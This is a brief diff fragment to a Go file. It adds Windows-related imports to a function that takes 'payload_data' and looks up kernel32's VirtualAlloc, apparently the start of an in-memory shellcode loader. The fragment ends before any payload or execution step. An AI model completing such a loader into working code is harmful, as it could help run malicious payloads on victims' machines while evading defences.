@@ -2,6 +2,14 @@
 
 package main
 
+import (
+	"os"
+	"time"
+	"unsafe"
+
+	"golang.org/x/sys/windows"
+)
+
 func run(payload_data []byte) {
 	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
 	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
